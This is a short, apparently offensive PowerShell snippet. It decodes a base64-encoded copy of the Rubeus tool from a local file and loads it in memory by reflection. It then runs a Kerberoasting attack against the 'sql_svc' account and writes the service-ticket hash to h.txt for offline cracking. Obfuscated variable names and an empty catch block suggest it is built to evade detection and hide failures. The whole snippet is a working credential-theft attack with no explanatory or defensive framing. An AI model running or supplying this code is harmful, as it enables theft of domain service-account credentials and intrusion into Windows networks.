try {
    $x7z9 = [System.IO.File]::ReadAllText("C:\temp\rubeus_b64.txt").Trim()
    $y3k2 = [Convert]::FromBase64String($x7z9)
    $z8m4 = [Reflection.Assembly]::Load($y3k2)
    $z8m4.EntryPoint.Invoke($null, (,([string[]]("kerberoast /user:sql_svc /outfile:h.txt"))))
} catch {}